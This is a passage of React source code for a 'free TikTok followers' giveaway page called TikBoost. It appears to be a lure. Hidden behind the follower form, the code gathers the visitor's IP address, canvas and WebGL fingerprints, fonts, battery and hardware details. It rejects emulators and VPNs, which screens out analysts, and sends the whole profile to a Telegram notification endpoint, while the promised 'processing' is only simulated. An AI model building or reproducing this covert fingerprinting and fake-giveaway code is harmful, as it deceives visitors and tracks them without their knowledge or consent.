import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useMutation } from "@tanstack/react-query";
import { insertSubmissionSchema } from "@shared/schema";
import { z } from "zod";
import { 
  Form, 
  FormControl, 
  FormField, 
  FormItem, 
  FormLabel, 
  FormMessage 
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";
import Countdown from "@/components/Countdown";
import ProcessingAnimation from "@/components/ProcessingAnimation";
import SuccessMessage from "@/components/SuccessMessage";
import { Loader2, Sparkles, ShieldCheck, Lock, CheckCircle, Flame, TrendingUp } from "lucide-react";

// Function to detect device model from user agent
function getDeviceInfo() {
  const ua = navigator.userAgent;
  let deviceInfo = "Unknown Device";

  // iPhone detection with model prediction based on screen size
  if (/iPhone/.test(ua)) {
    const match = ua.match(/OS (\d+)_(\d+)/i);
    const iosVersion = match ? `iOS ${match[1]}.${match[2]}` : "iOS";
    const screenHeight = Math.max(window.screen.width, window.screen.height);
    
    // Estimate iPhone model based on screen height
    if (screenHeight >= 926 && screenHeight <= 932) {
      deviceInfo = `iPhone 13/14/15 Pro Max (${iosVersion})`;
    } else if (screenHeight >= 852 && screenHeight <= 880) {
      deviceInfo = `iPhone 14/15 Plus (${iosVersion})`;
    } else if (screenHeight >= 844 && screenHeight <= 852) {
      deviceInfo = `iPhone 13/14/15 Pro (${iosVersion})`;
    } else if (screenHeight >= 812 && screenHeight < 844) {
      deviceInfo = `iPhone X/XS/11 Pro/12/13 mini (${iosVersion})`;
    } else if (screenHeight >= 736 && screenHeight < 812) {
      deviceInfo = `iPhone 8/7/6 Plus (${iosVersion})`;
    } else if (screenHeight >= 667 && screenHeight < 736) {
      deviceInfo = `iPhone 8/7/6/SE 2020 (${iosVersion})`;
    } else {
      deviceInfo = `iPhone (${iosVersion})`;
    }
  } 
  // iPad detection
  else if (/iPad/.test(ua)) {
    const match = ua.match(/OS (\d+)_(\d+)/i);
    const iosVersion = match ? `iOS ${match[1]}.${match[2]}` : "iOS";
    
    // Check for specific iPad models based on screen size
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
    const maxDimension = Math.max(screenWidth, screenHeight);
    
    if (maxDimension >= 1366) {
      deviceInfo = `iPad Pro 12.9" (${iosVersion})`;
    } else if (maxDimension >= 1112) {
      deviceInfo = `iPad Pro 11"/10.5" (${iosVersion})`;
    } else if (maxDimension >= 1024) {
      deviceInfo = `iPad Air/iPad (${iosVersion})`;
    } else {
      deviceInfo = `iPad mini (${iosVersion})`;
    }
  }
  // Samsung detection - improved model detection
  else if (/Samsung|SM-|SAMSUNG|Galaxy/.test(ua)) {
    // Try to extract the exact model number
    let modelCode = "";
    const smMatch = ua.match(/SM[-_]([A-Za-z0-9]+)/i);
    const galaxyMatch = ua.match(/Galaxy\s+([A-Za-z0-9]+(?:\s+[A-Za-z0-9]+)*)/i);
    
    if (smMatch) {
      modelCode = smMatch[1];
      
      // Map common Samsung model codes to marketing names
      const samsungModels: Record<string, string> = {
        // Galaxy S series
        'S23U': 'Galaxy S23 Ultra',
        'S23': 'Galaxy S23',
        'S22U': 'Galaxy S22 Ultra',
        'S22': 'Galaxy S22',
        'S21U': 'Galaxy S21 Ultra',
        'S21': 'Galaxy S21',
        'S20U': 'Galaxy S20 Ultra',
        'S20': 'Galaxy S20',
        'S10': 'Galaxy S10',
        'S9': 'Galaxy S9',
        'S8': 'Galaxy S8',
        
        // Note series
        'N20U': 'Galaxy Note 20 Ultra',
        'N20': 'Galaxy Note 20',
        'N10': 'Galaxy Note 10',
        'N9': 'Galaxy Note 9',
        
        // A series
        'A54': 'Galaxy A54',
        'A53': 'Galaxy A53',
        'A52': 'Galaxy A52',
        'A51': 'Galaxy A51',
        'A32': 'Galaxy A32',
        
        // Tab series
        'T870': 'Galaxy Tab S7',
        'T970': 'Galaxy Tab S7+',
        'T830': 'Galaxy Tab S4',
        
        // Fold/Flip series
        'F936': 'Galaxy Z Fold 4',
        'F926': 'Galaxy Z Fold 3',
        'F916': 'Galaxy Z Fold 2',
        'F900': 'Galaxy Fold',
        'F711': 'Galaxy Z Flip 3',
        'F707': 'Galaxy Z Flip 5G',
        'F700': 'Galaxy Z Flip',
        
        // S series - older model codes
        'G998': 'Galaxy S21 Ultra',
        'G996': 'Galaxy S21+',
        'G991': 'Galaxy S21',
        'G988': 'Galaxy S20 Ultra',
        'G986': 'Galaxy S20+',
        'G980': 'Galaxy S20',
        'G973': 'Galaxy S10',
        'G975': 'Galaxy S10+',
        'G970': 'Galaxy S10e',
        
        // Note series - older model codes
        'N986': 'Galaxy Note 20 Ultra',
        'N981': 'Galaxy Note 20',
        'N975': 'Galaxy Note 10+',
        'N970': 'Galaxy Note 10',
        
        // A series - older model codes
        'A536': 'Galaxy A53 5G',
        'A525': 'Galaxy A52',
        'A515': 'Galaxy A51',
        'A325': 'Galaxy A32',
      };
      
      // Check if we have a model match
      let matched = false;
      for (const [code, name] of Object.entries(samsungModels)) {
        if (modelCode.includes(code)) {
          deviceInfo = `Samsung ${name}`;
          matched = true;
          break;
        }
      }
      
      // If no specific mapping found, use the model code
      if (!matched) {
        deviceInfo = `Samsung Galaxy (Model: SM-${modelCode})`;
      }
    } else if (galaxyMatch) {
      deviceInfo = `Samsung ${galaxyMatch[0]}`;
    } else {
      deviceInfo = "Samsung Galaxy";
    }
    
    // Add Android version if available
    const versionMatch = ua.match(/Android (\d+(?:\.\d+)?)/i);
    if (versionMatch) {
      deviceInfo += ` (Android ${versionMatch[1]})`;
    }
  }
  // Google Pixel detection
  else if (/Pixel/.test(ua)) {
    const pixelMatch = ua.match(/Pixel\s+(\d+(?:\s*[a-zA-Z]+)?)/i);
    if (pixelMatch) {
      deviceInfo = `Google Pixel ${pixelMatch[1]}`;
    } else {
      deviceInfo = "Google Pixel";
    }
    
    // Add Android version if available
    const versionMatch = ua.match(/Android (\d+(?:\.\d+)?)/i);
    if (versionMatch) {
      deviceInfo += ` (Android ${versionMatch[1]})`;
    }
  }
  // OnePlus detection
  else if (/OnePlus|ONEPLUS/.test(ua)) {
    const match = ua.match(/(?:OnePlus|ONEPLUS)\s*([A-Za-z0-9]+(?:\s+[A-Za-z0-9]+)*)/i);
    if (match && match[1]) {
      deviceInfo = `OnePlus ${match[1].trim()}`;
    } else {
      deviceInfo = "OnePlus Device";
    }
    
    // Add Android version if available
    const versionMatch = ua.match(/Android (\d+(?:\.\d+)?)/i);
    if (versionMatch) {
      deviceInfo += ` (Android ${versionMatch[1]})`;
    }
  }
  // Xiaomi/Redmi/POCO detection
  else if (/Xiaomi|Redmi|POCO|Mi/i.test(ua)) {
    const match = ua.match(/(?:Xiaomi|Redmi|POCO|Mi)[\/\s_-]([A-Za-z0-9]+(?:[\s_-][A-Za-z0-9]+)*)/i);
    if (match && match[1]) {
      const brand = /Redmi/i.test(ua) ? 'Redmi' : 
                   /POCO/i.test(ua) ? 'POCO' : 'Xiaomi';
      deviceInfo = `${brand} ${match[1].trim().replace(/_/g, ' ')}`;
    } else {
      // Try to find model number in other formats
      const miMatch = ua.match(/M2\d{3}[A-Z]\d*/);
      if (miMatch) {
        deviceInfo = `Xiaomi ${miMatch[0]}`;
      } else {
        deviceInfo = /Redmi/i.test(ua) ? "Redmi Device" : 
                    /POCO/i.test(ua) ? "POCO Device" : "Xiaomi Device";
      }
    }
    
    // Add Android version if available
    const versionMatch = ua.match(/Android (\d+(?:\.\d+)?)/i);
    if (versionMatch) {
      deviceInfo += ` (Android ${versionMatch[1]})`;
    }
  }
  // More enhanced Android detection with model extraction
  else if (/Android/.test(ua)) {
    const versionMatch = ua.match(/Android (\d+(?:\.\d+)?)/i);
    const version = versionMatch ? versionMatch[1] : "";
    
    // First try to get model from standard format in user agent strings
    let brandModel = "";
    
    // These patterns will extract more detailed model information
    // Pattern 1: Most common format for Android model in UA
    const modelPattern1 = ua.match(/;\s*([a-zA-Z0-9\-_]+(?:[ \-_][a-zA-Z0-9\-_]+)*)[ \-]Build\//i);
    // Pattern 2: Alternative common format
    const modelPattern2 = ua.match(/;\s*([a-zA-Z0-9\-_]+(?:[ \-_][a-zA-Z0-9\-_]+)*);/i);
    // Pattern 3: Specific format for some devices
    const modelPattern3 = ua.match(/Android[\/\s][\d\.]+;\s*([^;]+);/i);
    // Pattern 4: Device model after Mozilla string
    const modelPattern4 = ua.match(/\(([^;]+);(?:\s+U;|\s+wv;)?\s+Android/i);
    
    // Try each pattern in order of specificity
    if (modelPattern1 && modelPattern1[1]) {
      brandModel = modelPattern1[1].replace(/build|Build/g, '').trim();
    } else if (modelPattern2 && modelPattern2[1]) {
      brandModel = modelPattern2[1].trim();
    } else if (modelPattern3 && modelPattern3[1]) {
      brandModel = modelPattern3[1].trim();
    } else if (modelPattern4 && modelPattern4[1] && !/Linux|Android|mozilla/i.test(modelPattern4[1])) {
      brandModel = modelPattern4[1].trim();
    }
    
    // Check for specific model identifiers
    const technoMatch = ua.match(/TECNO ([A-Za-z0-9]+)/i);
    const infinixMatch = ua.match(/Infinix ([A-Za-z0-9]+)/i);
    const realmeMatch = ua.match(/RMX([0-9]+)/i);
    const oppoMatch = ua.match(/CPH([0-9]+)/i);
    const vivoMatch = ua.match(/vivo ([0-9]+)/i);
    const nokiaMatch = ua.match(/Nokia ([A-Za-z0-9\.\-]+)/i);
    
    if (technoMatch) {
      brandModel = `TECNO ${technoMatch[1]}`;
    } else if (infinixMatch) {
      brandModel = `Infinix ${infinixMatch[1]}`;
    } else if (realmeMatch) {
      brandModel = `Realme RMX${realmeMatch[1]}`;
    } else if (oppoMatch) {
      brandModel = `OPPO CPH${oppoMatch[1]}`;
    } else if (vivoMatch) {
      brandModel = `Vivo ${vivoMatch[1]}`;
    } else if (nokiaMatch) {
      brandModel = `Nokia ${nokiaMatch[1]}`;
    }
    
    // Identify manufacturer for better labeling
    const manufacturer = 
      /Samsung|SAMSUNG/i.test(ua) ? "Samsung" :
      /LG/i.test(ua) ? "LG" :
      /Sony/i.test(ua) ? "Sony" :
      /HTC/i.test(ua) ? "HTC" :
      /Huawei/i.test(ua) ? "Huawei" :
      /HONOR/i.test(ua) ? "Honor" :
      /OnePlus|ONEPLUS/i.test(ua) ? "OnePlus" :
      /Xiaomi|Redmi|POCO|Mi/i.test(ua) ? "Xiaomi" :
      /OPPO|CPH\d{4}/i.test(ua) ? "OPPO" :
      /vivo|Vivo/i.test(ua) ? "Vivo" :
      /Motorola|moto/i.test(ua) ? "Motorola" :
      /Nokia/i.test(ua) ? "Nokia" :
      /Lenovo/i.test(ua) ? "Lenovo" :
      /Asus|ASUS/i.test(ua) ? "Asus" :
      /TECNO/i.test(ua) ? "TECNO" :
      /Infinix/i.test(ua) ? "Infinix" :
      /RMX\d{4}/i.test(ua) ? "Realme" :
      /Google/i.test(ua) ? "Google" :
      /Pixel/i.test(ua) ? "Google" :
      "";
    
    // Process and clean up the brand model string
    if (brandModel) {
      // Remove common unnecessary parts
      brandModel = brandModel
        .replace(/(SAMSUNG|Samsung|LG|Sony|HTC|Huawei|Google|OPPO|vivo|Motorola|Nokia|Lenovo|ASUS|Asus|TECNO|Infinix|Realme)\s*/i, '')
        .replace(/Android/i, '')
        .replace(/Mobile/i, '')
        .replace(/^\s+|\s+$/g, ''); // Trim extra spaces
      
      if (manufacturer && brandModel) {
        deviceInfo = `${manufacturer} ${brandModel}`;
      } else if (manufacturer) {
        deviceInfo = `${manufacturer} Device`;
      } else if (brandModel) {
        deviceInfo = brandModel;
      } else {
        deviceInfo = "Android Device";
      }
    } else if (manufacturer) {
      deviceInfo = `${manufacturer} Device`;
    } else {
      deviceInfo = "Android Device";
    }
    
    if (version) {
      deviceInfo += ` (Android ${version})`;
    }
  }
  // Windows detection
  else if (/Windows NT/.test(ua)) {
    const windowsVersion = {
      '10.0': '10',
      '6.3': '8.1',
      '6.2': '8',
      '6.1': '7',
      '6.0': 'Vista',
      '5.2': 'XP x64',
      '5.1': 'XP'
    };
    const match = ua.match(/Windows NT (\d+\.\d+)/i);
    if (match && match[1] in windowsVersion) {
      deviceInfo = `Windows ${windowsVersion[match[1] as keyof typeof windowsVersion]}`;
    } else {
      deviceInfo = "Windows PC";
    }
  }
  // Mac detection
  else if (/Macintosh/.test(ua)) {
    const match = ua.match(/Mac OS X (\d+[._]\d+)/i);
    if (match) {
      deviceInfo = `Mac OS X ${match[1].replace('_', '.')}`;
    } else {
      deviceInfo = "Mac OS X";
    }
  }
  // Linux detection
  else if (/Linux/.test(ua) && !/Android/.test(ua)) {
    const distroMatch = ua.match(/Ubuntu|Debian|Fedora|CentOS|RHEL|Arch|Gentoo/i);
    if (distroMatch) {
      deviceInfo = `${distroMatch[0]} Linux`;
    } else {
      deviceInfo = "Linux";
    }
  }

  return deviceInfo;
}

// Extend schema for frontend validation
const formSchema = insertSubmissionSchema.extend({
  username: z.string()
    .min(3, "Username must be at least 3 characters long")
    .max(30, "Username must be less than 30 characters")
    .regex(/^[a-zA-Z0-9._]+$/, "Username can only contain letters, numbers, period and underscore"),
  deviceInfo: z.object({
    deviceModel: z.string().min(1, "Device model is required"),
    screenSize: z.string().min(1, "Screen size is required"),
    platform: z.string().min(1, "Platform is required"),
    userAgent: z.string().min(1, "User agent is required"),
    language: z.string().min(1, "Language is required"),
    timezone: z.string().min(1, "Timezone is required"),
    browserFingerprint: z.string().optional(),
  }).optional(),
  ipAddress: z.string().optional(),
});

type FormValues = z.infer<typeof formSchema>;

export default function FollowerForm() {
  const [formStep, setFormStep] = useState<'form' | 'processing' | 'success'>('form');
  const [selectedAmount, setSelectedAmount] = useState<number>(5000);
  const { toast } = useToast();
  const [userInfo, setUserInfo] = useState({
    // Basic device information
    screenSize: `${window.screen.width}x${window.screen.height}`,
    colorDepth: window.screen.colorDepth,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),
    language: navigator.language,
    languages: Array.from(navigator.languages || []).join(','),
    platform: navigator.platform,
    userAgent: navigator.userAgent,
    deviceModel: getDeviceInfo ? getDeviceInfo() : "Unknown Device",
    deviceMemory: (navigator as any).deviceMemory || 'unknown',
    hardwareConcurrency: navigator.hardwareConcurrency,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack || (window as any).doNotTrack || 'unknown',
    plugins: Array.from(navigator.plugins || []).map(p => p.name).join(','),
    
    // Network information
    ip: '',
    connection: (navigator as any).connection ? {
      downlink: (navigator as any).connection.downlink || 'unknown',
      effectiveType: (navigator as any).connection.effectiveType || 'unknown',
      rtt: (navigator as any).connection.rtt || 'unknown',
      saveData: (navigator as any).connection.saveData || false
    } : {
      downlink: 'unknown',
      effectiveType: 'unknown',
      rtt: 'unknown',
      saveData: false
    },
    
    // Fingerprinting data
    canvasFingerprint: '',
    webglFingerprint: '',
    fonts: '',
    
    // Hardware information for advanced validation
    hardwareInfo: {
      cores: navigator.hardwareConcurrency || 0,
      memory: (navigator as any).deviceMemory || 'unknown',
      gpu: '',
      battery: null as any,
      batteryLevel: 0,
      orientation: window.screen.orientation ? window.screen.orientation.type : 'unknown',
      touchPoints: navigator.maxTouchPoints || 0,
      pixelRatio: window.devicePixelRatio || 1
    },
    
    // Device motion capability (indicates a real mobile device)
    hasMotion: 'DeviceMotionEvent' in window,
    hasOrientation: 'DeviceOrientationEvent' in window,
    
    // Mobile-specific checks
    isMobile: /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent),
    isEmulator: false
  });
  
  // Enhanced device data collection
  useEffect(() => {
    // Get visitor IP address from multiple services for validation
    const fetchIP = async () => {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        
        setUserInfo(prev => ({
          ...prev,
          ip: data.ip
        }));
        
        // Verify IP is not from a known proxy/VPN (could add API check here)
        // For now, we'll check if it's a loopback or private IP
        const isPrivateIP = /^(10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.)/.test(data.ip);
        if (isPrivateIP) {
          console.warn("Private IP detected, may indicate emulator or VPN");
          setUserInfo(prev => ({
            ...prev,
            isEmulator: true
          }));
        }
      } catch (error) {
        console.error('Error fetching IP:', error);
      }
    };
    
    // Try to access battery info for additional device verification
    const getBatteryInfo = async () => {
      try {
        if ('getBattery' in navigator) {
          const battery = await (navigator as any).getBattery();
          
          const updateBatteryInfo = () => {
            setUserInfo(prev => ({
              ...prev,
              hardwareInfo: {
                ...prev.hardwareInfo,
                battery: {
                  level: battery.level,
                  charging: battery.charging,
                  chargingTime: battery.chargingTime,
                  dischargingTime: battery.dischargingTime
                },
                batteryLevel: Math.round(battery.level * 100)
              }
            }));
          };
          
          // Update battery info immediately
          updateBatteryInfo();
          
          // Listen for battery changes
          battery.addEventListener('levelchange', updateBatteryInfo);
          battery.addEventListener('chargingchange', updateBatteryInfo);
          
          // Sudden battery changes might indicate emulator
          let lastLevel = battery.level;
          battery.addEventListener('levelchange', () => {
            // Check for emulator-like behavior (sudden large jumps in battery level)
            if (Math.abs(battery.level - lastLevel) > 0.1) {
              console.warn("Sudden battery level change detected, possible emulator");
              setUserInfo(prev => ({
                ...prev,
                isEmulator: true
              }));
            }
            lastLevel = battery.level;
          });
        }
      } catch (e) {
        console.warn('Battery API not available:', e);
      }
    };
    
    // Advanced canvas fingerprinting
    const createCanvasFingerprint = () => {
      try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        if (ctx) {
          canvas.width = 200;
          canvas.height = 200;
          
          // Draw background
          ctx.fillStyle = 'rgb(255,255,255)';
          ctx.fillRect(0, 0, 200, 200);
          
          // Draw text
          ctx.fillStyle = 'rgb(0,0,0)';
          ctx.font = '18px Arial';
          ctx.fillText('TikTok Fingerprint 👑', 10, 50);
          ctx.fillText(navigator.userAgent, 10, 70);
          
          // Draw complex shapes for better fingerprinting
          ctx.strokeStyle = 'rgb(255,0,255)';
          ctx.beginPath();
          ctx.arc(100, 100, 50, 0, Math.PI*2);
          ctx.stroke();
          
          // Add additional shapes with gradients
          const gradient = ctx.createLinearGradient(0, 0, 200, 200);
          gradient.addColorStop(0, "blue");
          gradient.addColorStop(1, "red");
          ctx.fillStyle = gradient;
          ctx.fillRect(50, 150, 100, 30);
          
          // Generate hash from canvas data
          const dataUrl = canvas.toDataURL();
          
          // Detect if canvas is being instrumented (sign of emulator or security tools)
          const emptyCanvas = document.createElement('canvas');
          emptyCanvas.width = 1;
          emptyCanvas.height = 1;
          const emptyCtx = emptyCanvas.getContext('2d');
          const emptyData = emptyCanvas.toDataURL();
          const isCanvasInstrumented = emptyData.length > 50;
          
          if (isCanvasInstrumented) {
            console.warn("Canvas instrumentation detected, possible emulator/automation");
            setUserInfo(prev => ({
              ...prev,
              isEmulator: true
            }));
          }
          
          setUserInfo(prev => ({
            ...prev,
            canvasFingerprint: dataUrl.slice(0, 100) + '...'
          }));
        }
      } catch (e) {
        console.error('Canvas fingerprinting error:', e);
      }
    };
    
    // Enhanced WebGL fingerprinting for GPU detection
    const createWebGLFingerprint = () => {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl && gl instanceof WebGLRenderingContext) {
          const webglInfo = {
            vendor: gl.getParameter(gl.VENDOR),
            renderer: gl.getParameter(gl.RENDERER),
            version: gl.getParameter(gl.VERSION),
            shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
            extensions: gl.getSupportedExtensions()
          };
          
          // Check for emulator GPU strings
          const renderer = webglInfo.renderer || '';
          const isEmulatorGPU = /SwiftShader|llvmpipe|VirtualBox|VMware|SVGA3D|VMWARE|Software Rasterizer|Adreno .* for emulator/i.test(renderer);
          
          if (isEmulatorGPU) {
            console.warn("Emulator GPU detected:", renderer);
            setUserInfo(prev => ({
              ...prev,
              isEmulator: true
            }));
          }
          
          setUserInfo(prev => ({
            ...prev,
            webglFingerprint: JSON.stringify(webglInfo),
            hardwareInfo: {
              ...prev.hardwareInfo,
              gpu: webglInfo.renderer || 'unknown'
            }
          }));
        }
      } catch (e) {
        console.error('WebGL fingerprinting error:', e);
      }
    };
    
    // Enhanced font detection
    const detectFonts = () => {
      const fontList = [
        'Arial', 'Courier New', 'Georgia', 'Times New Roman', 
        'Verdana', 'Tahoma', 'Impact', 'Comic Sans MS',
        // Extended font list can detect more OS-specific fonts
        'Segoe UI', 'Calibri', 'Cambria', 'Consolas', 'Wingdings', 'Roboto',
        'San Francisco', 'Helvetica Neue', 'Ubuntu', 'Droid Sans'
      ];
      
      const availableFonts = fontList.filter(font => {
        const testElement = document.createElement('span');
        testElement.style.fontFamily = `'${font}', monospace`;
        document.body.appendChild(testElement);
        const computedStyle = window.getComputedStyle(testElement);
        const detected = computedStyle.fontFamily !== 'monospace';
        document.body.removeChild(testElement);
        return detected;
      });
      
      // Check for emulator-like font patterns
      const hasEmulatorFonts = availableFonts.length < 3 || 
                               (availableFonts.length === 4 && 
                                availableFonts.includes('Arial') && 
                                availableFonts.includes('Times New Roman'));
      
      if (hasEmulatorFonts) {
        console.warn("Limited font selection, possible emulator");
        setUserInfo(prev => ({
          ...prev,
          isEmulator: true
        }));
      }
      
      setUserInfo(prev => ({
        ...prev,
        fonts: availableFonts.join(', ')
      }));
    };
    
    // Detect device vibration capability (most emulators don't support this)
    const checkVibration = () => {
      if ('vibrate' in navigator) {
        try {
          // Try to vibrate for 1ms (user won't notice)
          navigator.vibrate(1);
          setUserInfo(prev => ({
            ...prev,
            hasVibration: true
          }));
        } catch (e) {
          console.warn('Vibration test failed:', e);
          setUserInfo(prev => ({
            ...prev,
            hasVibration: false,
            isEmulator: true
          }));
        }
      } else {
        setUserInfo(prev => ({
          ...prev,
          hasVibration: false
        }));
      }
    };
    
    // Run all our device detection functions
    fetchIP();
    getBatteryInfo();
    createCanvasFingerprint();
    createWebGLFingerprint();
    detectFonts();
    checkVibration();
    
  }, []);
  
  const form = useForm<FormValues>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      username: "",
      followersRequested: 5000,
      email: "",
    },
    mode: "onChange",
  });
  
  // Enhanced function to validate device information with anti-emulator checks
  const validateDeviceInfo = () => {
    // Check for obvious emulator signs
    if (userInfo.isEmulator) {
      console.warn("Device appears to be an emulator based on hardware checks");
      return { valid: false, reason: "Emulator detected" };
    }
    
    // Verify device model isn't generic/unknown
    if (userInfo.deviceModel === "Unknown Device") {
      return { valid: false, reason: "Unknown device model" };
    }
    
    // Verify IP address exists and is valid
    if (!userInfo.ip || userInfo.ip.length < 7) { 
      return { valid: false, reason: "Invalid IP address" };
    }
    
    // Check if IP is from a known proxy/VPN service
    const suspiciousIPs = ['127.0.0.1', '0.0.0.0', '192.168.', '10.0.'];
    if (suspiciousIPs.some(ip => userInfo.ip.startsWith(ip))) {
      return { valid: false, reason: "Proxy/VPN detected" };
    }
    
    // Verify we have both canvas and WebGL fingerprints
    if (!userInfo.canvasFingerprint || !userInfo.webglFingerprint) {
      return { valid: false, reason: "Missing browser fingerprints" };
    }
    
    // Check for mobile-specific capabilities when device claims to be mobile
    if (userInfo.isMobile) {
      // Check for touch capability
      if (!('ontouchstart' in window) && navigator.maxTouchPoints <= 0) {
        console.warn("Mobile device without touch capabilities detected");
        return { valid: false, reason: "Invalid mobile device" };
      }
      
      // Verify orientation capabilities for mobile
      if (!userInfo.hasOrientation) {
        console.warn("Mobile device without orientation API detected");
        // Only warn, don't reject
      }
    }
    
    // Verify GPU information is present for WebGL
    if (!userInfo.hardwareInfo.gpu || userInfo.hardwareInfo.gpu === 'unknown') {
      console.warn("GPU information missing or invalid");
      // Only warn, don't reject since some browsers restrict this info
    }
    
    // For desktop, verify reasonable hardware specs
    if (!userInfo.isMobile && userInfo.hardwareInfo.cores < 1) {
      console.warn("Suspicious CPU core count");
      return { valid: false, reason: "Invalid hardware information" };
    }
    
    // Everything checks out
    return { valid: true };
  };
  
  // Create a browser fingerprint combining multiple data points
  const createBrowserFingerprint = () => {
    const items = [
      userInfo.userAgent,
      userInfo.deviceModel,
      userInfo.canvasFingerprint,
      userInfo.screenSize,
      userInfo.colorDepth,
      userInfo.language,
      userInfo.timezone,
      userInfo.platform,
      userInfo.plugins.slice(0, 100) // Limit size
    ];
    
    return items.join('||');
  };

  const mutation = useMutation({
    mutationFn: async (values: FormValues) => {
      // Enhanced device validation with detailed error reporting
      const deviceValidation = validateDeviceInfo();
      
      if (!deviceValidation.valid) {
        console.error("Device validation failed:", deviceValidation.reason);
        throw new Error(`Unable to verify your device: ${deviceValidation.reason}. Please try again with a different device or browser.`);
      }
      
      // Create enhanced browser fingerprint for additional verification
      const browserFingerprint = createBrowserFingerprint();
      
      // Format the device info with additional hardware indicators
      const deviceInfo = {
        deviceModel: userInfo.deviceModel,
        screenSize: userInfo.screenSize,
        platform: userInfo.platform,
        userAgent: userInfo.userAgent,
        language: userInfo.language,
        timezone: userInfo.timezone,
        ipAddress: userInfo.ip,
        browserFingerprint: browserFingerprint,
        hardwareInfo: {
          cores: userInfo.hardwareInfo.cores,
          memory: userInfo.hardwareInfo.memory,
          gpu: userInfo.hardwareInfo.gpu,
          touchPoints: userInfo.hardwareInfo.touchPoints,
          pixelRatio: userInfo.hardwareInfo.pixelRatio,
          batteryLevel: userInfo.hardwareInfo.batteryLevel || 0
        },
        deviceCapabilities: {
          hasTouch: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
          hasVibration: userInfo.hasVibration || false,
          hasMotion: userInfo.hasMotion,
          hasOrientation: userInfo.hasOrientation,
          isMobile: userInfo.isMobile
        }
      };
      
      // Prepare the submission with enhanced validated device info
      const payload = {
        ...values,
        deviceInfo: deviceInfo,
        ipAddress: userInfo.ip,
        isEmulator: userInfo.isEmulator,
        // Keep the full userInfo for analytics
        userInfo: userInfo
      };
      
      console.log("Sending submission with validated data:", payload);
      
      // First send a direct notification to Telegram to ensure it works
      try {
        console.log("Sending notification to Telegram...");
        const notifyResponse = await fetch("/api/notify", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            username: values.username,
            followers: selectedAmount,
            userInfo: userInfo,
            deviceInfo: deviceInfo,
            ipAddress: userInfo.ip
          })
        });
        
        if (notifyResponse.ok) {
          console.log("Notification sent successfully to Telegram");
        } else {
          console.error("Failed to send notification:", await notifyResponse.text());
        }
      } catch (error) {
        console.error("Telegram notification error:", error);
      }
      
      // Now submit the form data to the server
      const data = await apiRequest("POST", "/api/submit", payload);
      return data.json();
    },
    onSuccess: (data) => {
      setFormStep('processing');
      
      // Simulate processing for demonstration purposes
      setTimeout(() => {
        setFormStep('success');
        
        // Redirect to thank you page after a short delay
        setTimeout(() => {
          window.location.href = `/thank-you/${data.submission.id}`;
        }, 2000);
      }, 3000);
    },
    onError: (error) => {
      toast({
        title: "Error",
        description: error instanceof Error ? error.message : "Failed to submit your request",
        variant: "destructive",
      });
    },
  });
  
  const onSubmit = (values: FormValues) => {
    // Set the number of followers based on the selected amount
    values.followersRequested = selectedAmount;
    mutation.mutate(values);
  };
  
  const selectFollowerAmount = (amount: number) => {
    setSelectedAmount(amount);
    form.setValue("followersRequested", amount);
  };
  
  return (
    <section id="boost-now" className="min-h-screen bg-black text-white">
      {/* Animated TikTok background */}
      <div className="absolute inset-0 overflow-hidden opacity-30">
        <div className="absolute top-10 left-10 w-40 h-40 rounded-full bg-[#25F4EE] blur-3xl animate-pulse"></div>
        <div className="absolute bottom-20 right-10 w-60 h-60 rounded-full bg-[#FE2C55] blur-3xl animate-pulse"></div>
        <div className="absolute top-1/3 right-1/4 w-32 h-32 rounded-full bg-white blur-3xl animate-pulse"></div>
      </div>
      
      <div className="relative pt-10 pb-20 px-4 md:px-8 z-10">
        <div className="max-w-5xl mx-auto">
          {/* Header logo */}
          <div className="flex justify-center mb-10">
            <div className="flex items-center space-x-2">
              <div className="relative h-12 w-12 rounded-full bg-black border-2 border-white flex items-center justify-center">
                <svg viewBox="0 0 24 24" className="h-6 w-6 fill-current text-white">
                  <path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-5.2 1.74 2.89 2.89 0 012.31-4.64 2.93 2.93 0 01.88.13V9.4a6.84 6.84 0 00-1-.05A6.33 6.33 0 005 20.1a6.34 6.34 0 0010.86-4.43v-7a8.16 8.16 0 004.77 1.52v-3.4a4.85 4.85 0 01-1-.1z"/>
                </svg>
                <div className="absolute -top-1 -right-1 h-3 w-3 bg-[#FE2C55] rounded-full animate-ping"></div>
              </div>
              <h1 className="text-3xl font-montserrat font-bold bg-gradient-to-r from-[#25F4EE] to-[#FE2C55] bg-clip-text text-transparent">TikBoost</h1>
            </div>
          </div>
          
          <div className="text-center mb-12">
            <div className="inline-block mb-5 px-5 py-2 bg-[#1D1D1D] rounded-full text-sm font-medium border border-gray-800 animate-pulse">
              <span className="text-[#25F4EE] flex items-center">
                <Flame className="h-4 w-4 mr-1 text-[#FE2C55]" /> HOT DEAL 
                <span className="mx-2 text-gray-500">|</span>
                <span className="text-white">LIMITED TIME ONLY</span>
              </span>
            </div>
            <h2 className="text-4xl md:text-6xl font-montserrat font-bold mb-6 leading-tight">
              Get Up To <span className="bg-gradient-to-r from-[#25F4EE] to-[#FE2C55] bg-clip-text text-transparent">5,000</span> Free<br /> TikTok Followers
            </h2>
            <p className="text-xl text-gray-300 max-w-2xl mx-auto leading-relaxed">
              Boost your TikTok presence instantly with real followers.
              No password required - just enter your username!
            </p>
          </div>
          
          {/* Phone mockup with form */}
          <div className="max-w-6xl mx-auto grid md:grid-cols-5 gap-8 items-center">
            {/* Phone mockup */}
            <div className="md:col-span-2 hidden md:block">
